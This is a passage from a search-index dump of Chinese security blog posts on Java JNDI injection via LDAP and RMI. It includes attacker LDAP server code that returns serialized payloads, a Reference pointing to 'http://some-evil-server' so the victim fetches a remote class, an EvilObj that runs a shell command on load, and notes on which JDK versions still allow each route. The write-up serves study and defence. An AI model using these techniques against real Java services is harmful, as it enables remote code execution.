<p>\u5f53\u524d\u65b9\u6cd5\u6bd4\u8f83\u65b9\u4fbf\u7684\u662f\u53ef\u4ee5\u8f7d\u5165\u4efb\u610f\u7684\u4ee3\u7801\u6765\u6267\u884c\uff0c\u4f46\u662f\u5229\u7528\u6761\u4ef6\u6bd4\u8f83\u82db\u523b\u3002</p>","tags":["Java"]},{"location":"blog/2020/java-jmx-rmi-20200310/#0x03","title":"0x03 \u603b\u7ed3","text":"<p>\u5bf9\u4e8eJMX\u7684\u5229\u7528\u4e3b\u8981\u5229\u7528\u7684\u662f\u672c\u5730\u5b58\u5728\u7684Gadget\uff0c\u5982\u679c\u672c\u5730\u4e0d\u5b58\u5728Gadget\u7684\u8bdd\u5c31\u65e0\u6cd5\u5229\u7528\u6210\u529f\u3002\u9664\u975e\u6ee1\u8db3JMX MLet\u7684\u5229\u7528\u6761\u4ef6\uff0c\u901a\u8fc7\u52a0\u8f7dcodebase\u4e0a\u7684Jar\u6587\u4ef6\u6765\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u7531\u4e8e\u672c\u8eabJMX\u7528\u7684RMI\u90a3\u4e00\u5957\u4e1c\u897f\uff0c\u6240\u4ee5\u5982\u679c\u5728\u5408\u9002\u7684JDK\u7248\u672c\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u653b\u51fbRMI\uff0c\u4e0d\u8fc7\u524d\u63d0\u4ecd\u7136\u662f\u672c\u5730\u5b58\u5728\u76f8\u5173\u7684\u5229\u7528\u94fe\u3002</p> <p>\u6700\u540e\uff0c\u524d\u6587\u63d0\u5230\u7684\u653b\u51fb\u65b9\u6cd5\u6211\u5df2\u7ecf\u540c\u6b65\u5230github\u4e0a\u4e86</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-ldap-20200301/","title":"JNDI with LDAP","text":"","tags":["Java"]},{"location":"blog/2020/jndi-with-ldap-20200301/#0x00","title":"0x00 \u524d\u8a00","text":"<p>JNDI\u7684SPI\u5c42\u9664\u4e86RMI\u5916\uff0c\u8fd8\u53ef\u4ee5\u8ddfLDAP\u4ea4\u4e92\u3002\u4e0eRMI\u7c7b\u4f3c\uff0cLDAP\u4e5f\u80fd\u540c\u6837\u8fd4\u56de\u4e00\u4e2aReference\u7ed9JNDI\u7684Naming Manager\uff0c\u672c\u6587\u5c06\u8bb2\u8ff0JNDI\u4f7f\u7528ldap\u534f\u8bae\u7684\u4e24\u4e2a\u653b\u51fb\u9762XD</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-ldap-20200301/#0x01-ldap","title":"0x01 LDAP\u57fa\u7840","text":"<p>\u5173\u4e8eLDAP\u7684\u4ecb\u7ecd\uff0c\u5ef6\u4f38\u9605\u8bfb\u4e00\u4e0b\u8fd9\u7bc7</p> <p>LDAP can be used to store Java objects by using several special Java attributes. There are at least two ways a Java object can be represented in an LDAP directory:</p> <p>\u25cf Using Java serialization       o https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html \u25cf Using JNDI References       o https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html</p> <p>from https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</p> <p>Java\u4e2d\u7684LDAP\u53ef\u4ee5\u5728\u5c5e\u6027\u503c\u4e2d\u5b58\u50a8\u76f8\u5173\u7684Java\u5bf9\u8c61\uff0c\u53ef\u4ee5\u5b58\u50a8\u5982\u4e0a\u4e24\u79cd\u5bf9\u8c61\uff0c\u800c\u76f8\u5173\u7684\u95ee\u9898\u5c31\u662f\u51fa\u73b0\u5728\u8fd9\u90e8\u5206\u4e0a\u3002</p> <p>\u540e\u6587\u7528\u7684LDAP Server\u53c2\u8003\u7684\u662fmbechler \u5b9e\u73b0\u7684LDAPRefServer\uff0c\u8fde\u63a5\u7684\u5ba2\u6237\u7aefClient\u76f4\u63a5\u7528JNDI\u7684lookup\u5b8c\u6210\uff0cjdk\u7248\u672cjdk8u162</p> <pre><code>Context ctx = new InitialContext();\nctx.lookup(\"ldap://127.0.0.1:1389/EvilObj\");\nctx.close();\n</code></pre>","tags":["Java"]},{"location":"blog/2020/jndi-with-ldap-20200301/#0x02-ldap-with-jdni-references","title":"0x02 LDAP with JDNI References","text":"<p>JNDI\u53d1\u8d77ldap\u7684lookup\u540e\uff0c\u5c06\u6709\u5982\u4e0b\u7684\u8c03\u7528\u6d41\u7a0b\uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u6765\u5173\u6ce8\uff0c\u83b7\u5f97\u8fdc\u7a0bLDAP Server\u7684Entry\u4e4b\u540e\uff0cClient\u8fd9\u8fb9\u662f\u600e\u4e48\u505a\u5904\u7406\u7684</p> <p></p> <p>\u8ddf\u8fdbcom/sun/jndi/ldap/Obj.java#decodeObject\uff0c\u6309\u7167\u8be5\u51fd\u6570\u7684\u6ce8\u91ca\u6765\u770b\uff0c\u5176\u4e3b\u8981\u529f\u80fd\u662f\u89e3\u7801\u4eceLDAP Server\u6765\u7684\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u53ef\u80fd\u662f\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\uff0c\u4e5f\u53ef\u80fd\u662f\u4e00\u4e2aReference\u5bf9\u8c61\u3002\u5173\u4e8e\u5e8f\u5217\u5316\u5bf9\u8c61\u7684\u5904\u7406\uff0c\u6211\u4eec\u770b\u540e\u9762\u4e00\u8282\u3002\u8fd9\u91cc\u6458\u53d6\u4e86Reference\u7684\u5904\u7406\u65b9\u5f0f\uff1a</p> <pre><code>static Object decodeObject(Attributes attrs)\n    throws NamingException {\n    Attribute attr;\n    // Get codebase, which is used in all 3 cases.\n    String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE]));\n    try {\n        // ...\n        attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);// \"objectClass\"\n        if (attr != null &amp;&amp;\n            (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) || // \"javaNamingReference\"\n                attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) { // \"javanamingreference\"\n            return decodeReference(attrs, codebases);\n        }\n      //...\n</code></pre> <p>\u5982\u679cLDAP Server\u8fd4\u56de\u7684\u5c5e\u6027\u91cc\u5305\u62ec\u4e86<code>objectClass</code>\u548c<code>javaNamingReference</code>\uff0c\u5c06\u8fdb\u5165Reference\u7684\u5904\u7406\u51fd\u6570decodeReference\u4e0a</p> <pre><code>if ((attr = attrs.get(JAVA_ATTRIBUTES[CLASSNAME])) != null) {\n    className = (String)attr.get();\n} else {\n    throw new InvalidAttributesException(JAVA_ATTRIBUTES[CLASSNAME] +\n                \" attribute is required\");\n}\n\nif ((attr = attrs.get(JAVA_ATTRIBUTES[FACTORY])) != null) {\n    factory = (String)attr.get();\n}\n\nReference ref = new Reference(className, factory,\n    (codebases != null? codebases[0] : null));\n</code></pre> <p>decodeReference\u518d\u4ece\u5c5e\u6027\u4e2d\u63d0\u53d6\u51fa<code>javaClassName</code>\u548c<code>javaFactory</code>\uff0c\u6700\u540e\u5c06\u751f\u6210\u4e00\u4e2aReference\u3002\u8fd9\u91cc\u5982\u679c\u770b\u8fc7\u6211\u524d\u9762\u7684\u90a3\u7bc7jndi-with-rmi\uff0c\u53ef\u4ee5\u770b\u5230\u5176\u5b9e\u8fd9\u91cc\u751f\u6210\u7684ref\u5c31\u662f\u6211\u4eec\u5728RMI\u8fd4\u56de\u7684\u90a3\u4e2aReferenceWrapper\uff0c\u540e\u9762\u8fd9\u4e2aref\u5c06\u4f1a\u4f20\u9012\u7ed9Naming Manager\u53bb\u5904\u7406\uff0c\u5305\u62ec\u4ececodebase\u4e2d\u83b7\u53d6class\u6587\u4ef6\u5e76\u8f7d\u5165\u3002</p> <p>\u800c\u8fd9\u91ccLDAP\u4e5f\u7c7b\u4f3c\uff0c\u5904\u7406ref\u7684\u5bf9\u8c61\u662fNamingManager\u7684\u5b50\u7c7bjavax/naming/spi/DirectoryManager.java\uff0c\u56e0\u4e3a\u8ddfRMI\u6709\u70b9\u7c7b\u4f3c\u4e0d\u5177\u4f53\u5206\u6790\u4e86\uff0c\u6700\u540e\u540c\u6837\u7531javax/naming/spi/NamingManager.java#getObjectFactoryFromReference\u6765\u5904\u7406\u3002</p> <p>\u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u6765\u770bmbechler \u5b9e\u73b0\u7684LDAPRefServer\u5c31\u6bd4\u8f83\u6e05\u695a\u4e86</p> <p></p> <p>\u5f53\u5176\u83b7\u53d6\u5230LDAP\u8fde\u63a5\u65f6\uff0c\u5c06\u586b\u5145\u5982\u4e0a\u7684\u51e0\u4e2a\u5c5e\u6027\u53ca\u5176\u5bf9\u5e94\u7684\u503c\uff0c\u5c31\u662f\u4e3a\u4e86\u6ee1\u8db3\u4e0a\u9762\u7684\u6761\u4ef6\u800c\u751f\u6210\u4e00\u4e2aReference\u5bf9\u8c61\u3002</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-ldap-20200301/#0x03-ldap-with-serialized-object","title":"0x03 LDAP with Serialized Object","text":"<p>JNDI\u5bf9\u4e8e\u5c5e\u6027\u4e2d\u7684\u5e8f\u5217\u5316\u6570\u636e\u7684\u5904\u7406\u4e00\u5171\u6709\u4e24\u4e2a\u5730\u65b9\uff0c\u6211\u4eec\u5148\u6765\u987a\u7740\u524d\u9762\u7684JNDI Reference\u7684\u601d\u8def\u8bf4\u4e0b\u53bb</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-ldap-20200301/#comsunjndildapobjjavadecodeobject","title":"\u7b2c\u4e00\u5904\uff1acom/sun/jndi/ldap/Obj.java#decodeObject","text":"<p>\u5728com/sun/jndi/ldap/Obj.java#decodeObject\u4e0a\u8fd8\u5b58\u5728\u4e00\u4e2a\u5224\u65ad</p> <pre><code>if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) {// \u201cjavaSerializedData\u201d\n    ClassLoader cl = helper.getURLClassLoader(codebases);\n    return deserializeObject((byte[])attr.get(), cl);\n}\n</code></pre> <p>\u5982\u679c\u5728\u8fd4\u56de\u7684\u5c5e\u6027\u4e2d\u5b58\u5728<code>javaSerializedData</code>\uff0c\u5c06\u7ee7\u7eed\u8c03\u7528<code>deserializeObject</code>\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u4e3b\u8981\u5c31\u662f\u8c03\u7528\u5e38\u89c4\u7684\u53cd\u5e8f\u5217\u5316\u65b9\u5f0freadObject\u5bf9\u5e8f\u5217\u5316\u6570\u636e\u8fdb\u884c\u8fd8\u539f\uff0c\u5982\u4e0bpayload\u3002</p> <pre><code>@Override\nprotected void processAttribute(Entry entry){\n  entry.addAttribute(\"javaClassName\", \"foo\");\n  entry.addAttribute(\"javaSerializedData\", serialized);\n}\n</code></pre> <p>\u8fd9\u91cc\u6211\u4eec\u5c31\u4e0d\u9700\u8981\u901a\u8fc7\u8fdc\u7a0bcodebase\u7684\u65b9\u5f0f\u6765\u8fbe\u6210RCE\uff0c\u5f53\u7136\u9996\u5148\u672c\u5730\u73af\u5883\u4e0a\u9700\u8981\u6709\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6240\u4f9d\u8d56\u7684\u5e93\u6587\u4ef6\u3002</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-ldap-20200301/#comsunjndildapobjjavadecodereference","title":"\u7b2c\u4e8c\u5904\uff1acom/sun/jndi/ldap/Obj.java#decodeReference","text":"<p><code>decodeReference</code>\u51fd\u6570\u5728\u5bf9\u666e\u901a\u7684Reference\u8fd8\u539f\u7684\u57fa\u7840\u4e0a\uff0c\u8fd8\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5bf9RefAddress\u505a\u8fd8\u539f\u5904\u7406\uff0c\u5176\u4e2d\u8fd8\u539f\u8fc7\u7a0b\u4e2d\uff0c\u4e5f\u8c03\u7528\u4e86<code>deserializeObject</code>\u51fd\u6570\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u901a\u8fc7\u6ee1\u8db3RefAddress\u7684\u65b9\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u8fbe\u5230\u4e0a\u9762\u7b2c\u4e00\u79cd\u7684\u6548\u679c\u3002</p> <p>\u5177\u4f53\u4ee3\u7801\u592a\u957f\u4e86\uff0c\u8fd9\u91cc\u6211\u5c31\u8bf4\u4e00\u4e0b\u6761\u4ef6\uff1a</p> <ol> <li>\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e3a\u5206\u9694\u7b26</li> <li>\u7b2c\u4e00\u4e2a\u5206\u9694\u7b26\u4e0e\u7b2c\u4e8c\u4e2a\u5206\u9694\u7b26\u4e4b\u95f4\uff0c\u8868\u793aReference\u7684position\uff0c\u4e3aint\u7c7b\u578b</li> <li>\u7b2c\u4e8c\u4e2a\u5206\u9694\u7b26\u4e0e\u7b2c\u4e09\u4e2a\u5206\u9694\u7b26\u4e4b\u95f4\uff0c\u8868\u793atype\uff0c\u7c7b\u578b</li> <li>\u7b2c\u4e09\u4e2a\u5206\u9694\u7b26\u662f\u53cc\u5206\u9694\u7b26\u7684\u5f62\u5f0f\uff0c\u5219\u8fdb\u5165\u53cd\u5e8f\u5217\u5316\u7684\u64cd\u4f5c</li> <li>\u5e8f\u5217\u5316\u6570\u636e\u7528base64\u7f16\u7801</li> </ol> <p>\u6ee1\u8db3\u4e0a\u9762\u7684\u6761\u4ef6\uff0c\u6784\u9020\u4e00\u4e2a\u7c7b\u4f3c\u7684</p> <pre><code>protected void processAttribute(Entry entry){\n  entry.addAttribute(\"javaClassName\", \"foo\");\n  entry.addAttribute(\"javaReferenceAddress\",\"$1$String$$\"+new BASE64Encoder().encode(serialized));\n  entry.addAttribute(\"objectClass\", \"javaNamingReference\"); //$NON-NLS-1$\n}\n</code></pre> <p>\u5f53\u7136\u7b2c\u4e8c\u5904\u53ea\u662f\u4e00\u4e2a\u9526\u4e0a\u6dfb\u82b1\u7684\u6b65\u9aa4\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u7528\u7b2c\u4e00\u79cd\u65b9\u6cd5\uff0c\u7b2c\u4e8c\u79cd\u5728\u7b2c\u4e00\u79cd\u4e0d\u80fd\u7528\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u8bd5\u8bd5\u3002</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-ldap-20200301/#0x04","title":"0x04 \u540e\u7eed","text":"<p>\u81eajdk8u191-b02\u7248\u672c\u540e\uff0c\u65b0\u6dfb\u52a0\u4e86<code>com.sun.jndi.ldap.object.trustURLCodebase</code>\u9ed8\u8ba4\u4e3afalse\u7684\u9650\u5236\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u8fdc\u7a0bcodebase\u7684Reference\u65b9\u5f0f\u88ab\u9650\u5236\u6b7b\u4e86\uff0c\u6211\u4eec\u53ea\u80fd\u901a\u8fc7SerializedData\u7684\u65b9\u6cd5\u6765\u8fbe\u6210\u5229\u7528\u3002</p> <p>\u6211\u4eec\u6765\u6574\u7406\u4e00\u4e0b\uff0c\u5173\u4e8ejndi\u7684\u76f8\u5173\u5b89\u5168\u66f4\u65b0</p> <ul> <li>JDK 6u132, JDK 7u122, JDK 8u113\u4e2d\u6dfb\u52a0\u4e86com.sun.jndi.rmi.object.trustURLCodebase\u3001com.sun.jndi.cosnaming.object.trustURLCodebase \u7684\u9ed8\u8ba4\u503c\u53d8\u4e3afalse\u3002</li> </ul> <p>\u5bfc\u81f4jndi\u7684rmi reference\u65b9\u5f0f\u5931\u6548\uff0c\u4f46ldap\u7684reference\u65b9\u5f0f\u4ecd\u7136\u53ef\u884c</p> <ul> <li>Oracle JDK 11.0.1\u30018u191\u30017u201\u30016u211\u4e4b\u540e <code>com.sun.jndi.ldap.object.trustURLCodebase</code>\u5c5e\u6027\u7684\u9ed8\u8ba4\u503c\u88ab\u8c03\u6574\u4e3afalse\u3002</li> </ul> <p>\u5bfc\u81f4jndi\u7684ldap reference\u65b9\u5f0f\u5931\u6548\uff0c\u5230\u8fd9\u91cc\u4e3a\u6b62\uff0c\u8fdc\u7a0bcodebase\u7684\u65b9\u5f0f\u57fa\u672c\u5931\u6548\uff0c\u9664\u975e\u8ba4\u4e3a\u8bbe\u4e3atrue</p> <p>\u800c\u5728\u6700\u65b0\u7248\u7684jdk8u\u4e0a\uff0cjndi ldap\u7684\u672c\u5730\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe1\u548c2\u7684\u65b9\u5f0f\u4ecd\u7136\u672a\u5931\u6548\uff0cjndi rmi\u5e95\u5c42(JRMPListener)StreamRemoteCall\u7684\u672c\u5730\u5229\u7528\u65b9\u5f0f\u4ecd\u672a\u5931\u6548\u3002</p> <p>\u6240\u4ee5\u5982\u679cReference\u7684\u65b9\u5f0f\u4e0d\u884c\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u5229\u7528\u672c\u5730ClassPath\u91cc\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6765\u8fbe\u6210RCE\u3002</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-ldap-20200301/#0x05","title":"0x05 \u603b\u7ed3","text":"<p>JNDI\u548cLDAP\u7684\u7ed3\u5408\uff0c\u51fa\u73b0\u4e862\u79cd\u5229\u7528\u65b9\u5f0f\uff0c\u4e00\u662f\u5229\u7528\u8fdc\u7a0bcodebase\u7684\u65b9\u5f0f\uff0c\u4e8c\u662f\u5229\u7528\u672c\u5730ClassPath\u91cc\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u3002\u5728\u6700\u65b0\u7248\u7684jdk8u\u4e2d\uff0ccodebase\u7684\u65b9\u5f0f\u4f9d\u8d56<code>com.sun.jndi.ldap.object.trustURLCodebase</code>\u7684\u503c\uff0c\u800c\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u4ecd\u672a\u5931\u6548\u3002</p> <p>LDAP\u7684\u4f7f\u7528\u65b9\u6cd5\u9664\u4e86JNDI\u7684lookup\uff0c\u5176\u4ed6\u7684\u5e93\u4e5f\u4f1a\u6709\u76f8\u5e94\u7684\u4f7f\u7528\u65b9\u6cd5\uff0c\u5982Spring\u7684ldap\uff0c\u8fd9\u91cc\u8fd8\u53ef\u4ee5\u7ee7\u7eed\u6df1\u5165\u4e0b\u53bb\uff0c\u5148\u6316\u4e2a\u5751XD</p> <p>\u6700\u540e\uff0c\u4e0a\u9762\u7684\u4e24\u4e2aldap Server\u66f4\u65b0\u5230\u4e86github\u4e0a\uff0c\u81ea\u53d6XD</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/","title":"JNDI with RMI","text":"","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#0x00","title":"0x00 \u524d\u8a00","text":"<p>\u5728\u73b0\u5b9e\u73af\u5883\u4e2d\uff0c\u9047\u5230RMI Registry\u7684\u673a\u4f1a\u5f88\u5c11\uff0c\u800c\u7ed3\u5408\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684JNDI\u6ce8\u5165\u5219\u5e38\u89c1\u4e86\u8bb8\u591a\u3002\u672c\u6587\u5c06\u4ecb\u7ecdRMI\u7ed3\u5408JNDI\u540e\u53ef\u4ee5\u505a\u54ea\u4e9b\u4e8b\u60c5XD</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#0x01","title":"0x01 \u57fa\u7840","text":"<p>\u5728\u770bJNDI\u540cRMI\u7684\u5229\u7528\u524d\uff0c\u6211\u4eec\u5148\u6765\u770b\u770b\u5173\u4e8eRMI\u52a8\u6001\u7c7b\u52a0\u8f7d\u7684\u6982\u5ff5\u3002</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#rmi","title":"RMI\u52a8\u6001\u7c7b\u52a0\u8f7d","text":"<p>RMI\u6709\u4e00\u4e2a\u91cd\u8981\u7684\u7279\u6027\u662f\u52a8\u6001\u7c7b\u52a0\u8f7d\u673a\u5236\uff0c\u5f53\u672c\u5730CLASSPATH\u4e2d\u65e0\u6cd5\u627e\u5230\u76f8\u5e94\u7684\u7c7b\u65f6\uff0c\u4f1a\u5728\u6307\u5b9a\u7684codebase\u91cc\u52a0\u8f7dclass\u3002codebase\u53ef\u4ee5\u5728\u7cfb\u7edf\u5c5e\u6027java.rmi.server.codebase\u8bbe\u7f6e\u5176URL\u3002\u5982\u679ccodebase\u7684URL\u53ef\u63a7\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8f7d\u5165\u4efb\u610f\u7684class\u6216jar\u6587\u4ef6\u3002\u6839\u636eP\u725b\u7684Java\u5b89\u5168\u6f2b\u8c08- RMI\u7bc7\u4e2d\u63d0\u5230\uff0c\u901a\u8fc7\u4fee\u6539\u4f20\u9012\u8fc7\u7a0b\u4e2d\u7684\u5e8f\u5217\u5316\u6570\u636e\uff0c\u5c06\u5176\u4e2d\u7684codebase\u4fee\u6539\u4e3a\u6076\u610f\u7684server\uff0c\u8fd9\u6837\u53ef\u4ee5\u8fbe\u5230RMI Server\u7aef\u88ab\u653b\u51fb\u7684\u6548\u679c\u3002\u4e0d\u8fc7\uff0c\u8fd9\u4e2a\u5229\u7528\u6761\u4ef6\u6bd4\u8f83\u82db\u523b\uff0c\u5e76\u4e14oracle\u5728\u540e\u9762\u5bf9\u5176\u505a\u4e86\u9650\u5236\uff0c\u5982\u679c\u8981\u6210\u529f\u5229\u7528\u9700\u8981\u6ee1\u8db3\u5982\u4e0b\u8981\u6c42\uff1a</p> <ul> <li>\u5b89\u88c5\u5e76\u914d\u7f6e\u4e86SecurityManager</li> <li>Java\u7248\u672c\u4f4e\u4e8e7u21\uff0c6u45\u6216\u8005\u8bbe\u7f6e\u4e86<code>java.rmi.server.useCodebaseonly=false</code></li> </ul> <p>\u6458\u81eaJava\u5b89\u5168\u6f2b\u8c08-RMI\u7bc7</p> <p>\u5176\u4e2d\u4e0a\u9762\u7684\u914d\u7f6e\uff0c\u57287u21\uff0c6u45\u540e\u7684\u7248\u672c\u91cc\u9ed8\u8ba4\u4e3a<code>true</code>\uff0c\u90a3\u4e48\u4e5f\u5c31\u65e0\u6cd5\u4ece\u8fdc\u7a0bcodebase\u4e2d\u8f7d\u5165\u7c7b\uff0c\u907f\u514d\u4e86\u4e0a\u9762\u8bf4\u7684\u8fd9\u79cd\u653b\u51fb\u7684\u53ef\u80fd\u6027\u3002</p>","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#jndi","title":"JNDI\u7684\u76f8\u5173\u6982\u5ff5","text":"<p>Java Naming and Directory Interface (JNDI) is a Java API that allows clients to discover and look up data and objects via a name.</p> <p>https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</p> <p>JNDI\u65b9\u4fbf\u4e86\u4e0enaming service\u548cDirectory service\u7684\u4ea4\u4e92\uff0c\u901a\u8fc7\u6307\u5b9a\u7279\u5b9a\u7684URL\u5373\u53ef\u4e0e\u4e0d\u540c\u7684\u670d\u52a1\u8fdb\u884c\u4ea4\u4e92\u3002\u76f8\u5f53\u4e8e\u5bf9\u8fd9\u4e9b\u670d\u52a1\u7684API\u53c8\u8fdb\u884c\u4e86\u4e00\u6b21\u5c01\u88c5\u4f9b\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u3002\u5176\u4e2dJNDI\u4e2d\u4e5f\u5b58\u5728\u4e0a\u8ff0RMI codebase\u7684\u52a8\u6001\u52a0\u8f7d\u673a\u5236\uff0c\u5e76\u4e14\u5176\u914d\u7f6e\u540c\u5e95\u5c42\u7684RMI\u914d\u7f6e\u5e76\u4e0d\u76f8\u5173\u3002</p> <p></p> <p>\u4ece\u4e0a\u8ff0\u7684\u6784\u67b6\u6765\u770b\uff0c\u52a8\u6001\u52a0\u8f7d\u53d1\u751f\u4e8e\u4e24\u4e2a\u90e8\u5206\uff0cNaming Manager\u548cJNDI SPI\u3002\u8fd9\u91ccSPI\u90e8\u5206\u5c31\u662f\u76f8\u5bf9\u5e94\u7684\u670d\u52a1\u7684\u914d\u7f6e\uff0c\u6bd4\u5982\u524d\u6587\u63d0\u5230\u7684RMI\u7684\u9650\u5236\u5c31\u662fSPI\u90e8\u5206\u7684\u3002\u800cNaming Manager\u4e5f\u5b58\u5728\u4e00\u4e2a\u52a8\u6001\u52a0\u8f7d\u673a\u5236\u5e76\u4e14\u5176\u5728\u4fee\u590d\u524d\u5e76\u65e0\u9650\u5236\uff0c\u8fd9\u91ccNaming Manager\u90e8\u5206\u7528\u5230\u7684\u662fJNDI\u7684Naming References</p> <p>In order to bind Java objects in a Naming or Directory service, it is possible to use Java serialization to get the byte array representation of an object at a given state. However, it is not always possible to bind the serialized state of an object because it might be too large or it might be inadequate.</p> <p>For such needs, JNDI defined Naming References (or just References from now on) so that objects could be stored in the Naming or Directory service indirectly by binding a reference that could be decoded by the Naming Manager and resolved to the original object.</p> <p>https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</p> <p>\u8fd9\u91cc\u63d0\u5230\u7531\u4e8e\u67d0\u4e9b\u60c5\u51b5\u4e0d\u80fd\u76f4\u63a5\u5c06\u8fdc\u7a0bobj\u8fd4\u56de\uff0c\u6240\u4ee5JNDI\u63d0\u51fa\u4e86Naming References\u7684\u65b9\u6cd5\uff0c\u8fd4\u56de\u76f8\u5e94\u7684Reference\u800c\u4e0d\u8fd4\u56de\u5177\u4f53\u7684obj\u3002\u7edf\u4e00\u7531JNDI\u7684\u8bf7\u6c42\u7aef\u53bb\u52a0\u8f7d\u6307\u5b9a\u7684\u5730\u5740\u4e0a\u7684obj\u3002\u8fd9\u91cc\u52a0\u8f7d\u65b9\u6cd5\u4e2d\u5c31\u5305\u62ec\u8fdc\u7a0bcodebase\u7684\u65b9\u6cd5\uff0c\u6765\u770b\u4e2a\u4f8b\u5b50</p> <pre><code>String FactoryURL = \"http://some-evil-server\";\nReference reference = new Reference(\"MyClass\",\"MyClass\",FactoryURL);\nReferenceWrapper wrapper = new ReferenceWrapper(reference);\nctx.bind(\"Foo\", wrapper);// \u7ed1\u5b9areference\n</code></pre> <p>\u8bf7\u6c42\u7aef\u4ee5lookup\u8bf7\u6c42\u4e0a\u8ff0\u7ed1\u5b9a\u7684RMI\u670d\u52a1\u5373\u53ef\u3002\u5176\u5904\u7406\u8fc7\u7a0b\u5f15\u7528https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</p> <p></p>","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#0x02","title":"0x02 \u539f\u7406","text":"","tags":["Java"]},{"location":"blog/2020/jndi-with-rmi-20200209/#jndi-with-rmi-demo","title":"JNDI with RMI DEMO","text":"<p>\u4e3a\u4e86\u66f4\u597d\u7684\u8bf4\u660e\uff0c\u4ee5\u4e0b\u9762\u7684\u4ee3\u7801\u4e3a\u4f8b</p> <pre><code>package train.jndi;\n\nimport com.sun.jndi.rmi.registry.ReferenceWrapper;\n\nimport javax.naming.Reference;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\n\n/**\n * @author wh1t3P1g\n * @since 2020/2/4\n */\npublic class Server {\n\n    public static void main(String[] args) throws Exception {\n        Registry registry = LocateRegistry.createRegistry(1099);\n\n        String FactoryURL = \"http://localhost/\";\n        Reference reference = new Reference(\"EvilObj\",\"EvilObj\",FactoryURL);\n        ReferenceWrapper wrapper = new ReferenceWrapper(reference);\n        registry.bind(\"Foo\", wrapper);\n    }\n}\n</code></pre> <p>Server\u7aef\u4ee5RMI Registry\u6ce8\u518c\u4e00\u4e2aReference\uff0c\u5e76\u5c06factoryURL\u6307\u5b9a\u4e3alocalhost</p> <pre><code>package train.jndi;\n\nimport javax.naming.Context;\nimport javax.naming.InitialContext;\n\n/**\n * @author wh1t3P1g\n * @since 2020/2/4\n */\npublic class Client {\n    public static void main(String[] args) throws Exception {\n        Context ctx = new InitialContext();\n        ctx.lookup(\"rmi://localhost:1099/Foo\");\n    }\n}\n</code></pre> <p>Client\u7aef\u6bd4\u8f83\u7b80\u5355\uff0c\u76f4\u63a5\u4ee5lookup\u6307\u5b9a\u7684RMI URL\u5373\u53ef\u3002\u6839\u636e\u4e0a\u9762\u7684\u8fc7\u7a0b\u56fe\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\u6700\u7ec8\u6267\u884cEvilObj\u7684\u5730\u65b9\u662fClient\u7aef(jndi\u53d1\u8d77lookup\u7684\u65b9\u6cd5)\u3002\u6700\u540e\u6211\u4eec\u521b\u4e00\u4e2aEvilObj</p> <pre><code>/**\n * @author wh1t3P1g\n * @since 2020/2/4\n */\npublic class EvilObj {\n\n    public EvilObj() throws Exception {\n        Runtime rt = Runtime.getRuntime();\n        String[] commands = {\"/bin/sh\", \"-c\", \"open /System/Applications/Calculator.app\"};\n        rt.exec(commands);\n    }\n}\n</code></pre> <p><code>javac EvilObj.java</code>\u751f\u6210EvilObj.class\uff0c\u7136\u540e\u6302\u8f7d\u5230\u4e00\u4e2aweb\u670d\u52a1\u4e0a\u5c31\u53ef\u4ee5\u4e86\u3002\u53ef\u4ee5\u76f4\u63a5\u9009\u62e9python\u6765\u6302\u8f7d</p> 